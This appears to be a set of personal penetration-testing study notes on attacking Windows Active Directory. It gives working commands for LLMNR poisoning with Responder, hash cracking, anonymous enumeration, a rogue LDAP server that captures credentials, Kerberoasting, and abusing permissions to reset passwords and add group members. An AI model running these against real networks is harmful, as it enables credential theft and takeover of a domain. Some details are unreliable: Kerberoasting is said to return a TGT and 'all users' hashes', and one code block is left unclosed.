# What is AD?
AD is an identity/security policy management framework for managing large fleets of Windows computers. Windows comes with support for it out of the box. 

# Domain Reconnaissance
## Passive
- [[Responder]]
	- Use analysis mode
- OSINT
- [[Wireshark]]/[[Tcpdump]]

## Active
- [[Nmap]]
- [[Fping]]
- [[Kerbrute]]
- LOLBins

```shell
systeminfo | findstr Domain # Get domain joined status and name
Get-ADUser -Filter * # Get all AD users
Get-ADUser -Filter * -SearchBase "CN=Users,DC=<name of domain>,DC=COM" # Get more info
```
# LLMNR/NBT-NS Poisoning

LLMNR poisoning works similarly to ARP poisoning. LLMNR is a protocol similar to DNS used inside AD environments. 

- [[Responder]] (Linux Hosts)
- [[Inveigh]] (Windows Hosts)
- [[Hashcat]]

```shell
responder -I <iface> -A # Listen only, do not poison
responder -I <iface> # Poison and intercept responses
```

Poisoning this connection with Responder or Inveigh provides us an opportunity to MITM the connection between these two computer and sniff password hashes from the wire directly. These hashes are NetNTLMv2, which means they cannot be used in PTH attacks, but they can still be cracked with Hashcat in mode 5600. 

```shell
hashcat -m 5600 <NetNTLMv2> <wordlist>
```

This attack can be prevented only by disabling these protocols, which should be done carefully, as we are not always aware of what relies on what within our network. 

# Enumerating Password Policies
- [[Enum4Linux]]
- [[CrackMapExec]]
- [[RPCclient]]

All of these tools rely on an SMB Null session to work if we do not already have domain credentials. From Windows we can try

```shell
net use \\<DC>\ipc$ "" /u:"" # Test if SMB null sessions are allowed 
```

- [[LDAPSearch]]
- [[PowerView]]

LDAPSearch uses an LDAP Anonymous Bind session to enumerate password policy. 

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

From Windows is even easier.

```shell
net accounts
```

# Enumerating Domain Users
- [[LDAPSearch]]
- [[CrackMapExec]]
- [[RPCclient]]
- [[Enum4Linux]]
- [[Kerbrute]]
- LOL Solutions (like the AD module)

# Password Spraying
- [[Kerbrute]]
- [[CrackMapExec]]
- [[DomainPasswordSpray]] (Windows)

Password Spraying can get us one AD User and password pair, which can give us all ad users' hashes via Kerberoasting. 

# Rogue LDAP
If you have control over where LDAP requests are being sent, perhaps on a networked and unsecured printer, you can configure a rogue LDAP server and sniff the cleartext credentials with Wireshark.

```shell
# Start a rogue LDAP server on Kali
apt install slapd ldap-utils
systemctl start slapd
dpkg-reconfigure -p low slapd
<select No>
<enter domain you are attacking/impersonating>
<re-enter domain you are impersonating>
<any password will work>
<select MDB>
<select No>
<select Yes>

echo "dn: cn=config" > olcSaslSecProps.ldif
echo "replace: olcSaslSecProps" >> olcSaslSecProps.ldif
echo "olcSaslSecProps: noanonymous,minssf=0,passcred" >> olcSaslSecProps.ldif

ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif
service slapd restart

tcpdump -SX -i <interface> tcp port 389
```

# Credential Injection
## Runas
```powershell
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

With credential access and a Windows machine you can connect to the domain and use the Microsoft Management Console to enumerate machines and users in the environment. 
# Enumerating Security Controls

This Powershell will give lots of valuable information about the domain and your privileges within it. 

```powershell
Get-MpComputerStatus # Check for Windows Defender
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections # Get AppLocker Status
$ExecutionContext.SessionState.LanguageMode # Determines PowerShell Execution Language Mode (Constrained or Full access to PS functions)
Find-LAPSDelegatedGroups # Identify LAPS users and groups
Find-AdmPwdExtendedRights # Determine which devices you have access to LAPS on
Get-LAPSComputers # Find LAPS-enabled devices
```

- [[CrackMapExec]]
- [[RPCclient]]
- [[Impacket]]
- [[SMBMap]]
- [[WinDAPSearch]]
- [[BloodHound]]
- Powershell ActiveDirectory Module (Windows)
- [[PowerView]]
- [[Snaffler]]

```powershell
# PowerShell Active Directory Module

Get-Module # List modules available for import
Import-Module ActiveDirectory # Import the AD module if not already present
Get-ADDomain # Get lots of information about the domain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName # Get Kerberoastable users (Service Accounts)
Get-ADTrust -Filter * # Enumerate trust relationships within domain
Get-ADGroup -Filter * | select name # List AD groups
Get-ADGroup -Identity <groupname> # Get detailed group info
Get-ADGroupMember -Identity <groupname> # Get group members
```

# LOL Enumeration Solutions
- [[DSQuery]]

If you can attach your own Windows VM to the domain, you can use these techniques to enumerate from it with [[Runas]] to inject valid AD credentials.

# Kerberoasting
- [[Impacket]]
- [[Rubeus]] (Windows)
- [[Hashcat]]
- [[PowerView]]

We can use GetUserSPNs from Impacket to get a TGT to crack with hashcat's mode 13100. Rubeus can be used for the same purpose from Windows. Both can be cracked with Hashcat -m 13100. Kerberoasting can also be performed across different domain with cross-domain trusts. This is especially useful for gaining access across an enterprise or gathering passwords that are not vulnerable in the current domain. 

# Exploiting Dangerous Permissions
Some examples of dangerous permissions include:
- ForceChangePassword
	- User can forcibly change another users' password
- AddMembers
	- Users with this permission can add users, groups, and computers to another group
- GenericAll
	- Complete control over an object
- GenericWrite
	- Update any non-protected parameters of a target object
- WriteOwner
	- Update owner of a target object
- WriteDACL
	- Write new ACEs to the target object's DACL
- AllExtendedRights
	- Permission to perform any action associated with extended AD rights (including for changing password etc.)

```powershell
# Change an account password

Set-ADAccountPassword -Identity "<AD user username>" -Reset -NewPassword $Password

# Add a user to a group
Add-ADGroupMember "IT Support" -Members "<AD user username>" 
```

# Exploiting Constrained Delegation
```powershell
Get-NetUser -TrustedToAuth # Powerview module to get service accounts trusted to authenticate users to services. (Accounts that can request a TGT)
# Use mimikatz or rubeus to get credentials for this user

# Begin a remote powershell session on a target machine (tickets should be in memory for an impersonated user delegating WSMAN and HTTP authority)

Enter-PSSession -ComputerName <remote server name>

# Exploiting Certificate Misconfigurations
Four attributes are required for a certificate misconfiguration to lead to privilege escalation:
- Client Authentication
- CT_FLAG_ENROLEE_SUPPLIES_SUBJECT
- CTPRIVATEKEY_FLAG_EXPORTABLE_KEY
- Certificate Permissions

We can view all certificate templates using the following windows utility.

```powershell
certutil -Template -v > templates.txt
```

# Domain Trusts
- [[BloodHound]]
- [[Impacket]]
- [[Rubeus]]
- [[Mimikatz]]

If a domain is a child of another domain or forest, you can use default directional trusts to forge a golden ticket. Since the Administrator of the DC of the child domain by default has administrative privileges over the parent domain, we can compromise the entire enterprise with DA on the child domain.
